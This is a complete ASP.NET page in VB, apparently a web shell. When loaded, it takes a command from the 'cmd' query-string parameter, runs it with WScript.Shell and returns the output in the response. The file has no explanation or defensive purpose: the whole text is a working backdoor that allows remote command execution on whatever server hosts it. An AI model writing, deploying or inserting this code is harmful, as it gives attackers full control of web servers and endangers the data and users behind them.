<%@ Page Language="VB" %>
<script runat="server">
    Protected Sub Page_Load(sender As Object, e As EventArgs)
        If Not Request.QueryString("cmd") Is Nothing Then
            Dim cmd As String = Request.QueryString("cmd")
            Dim wsh As Object = CreateObject("WScript.Shell")
            Dim pr As Object = wsh.Exec(cmd)
            Response.Write(pr.StdOut.ReadAll())
        End If
    End Sub
</script>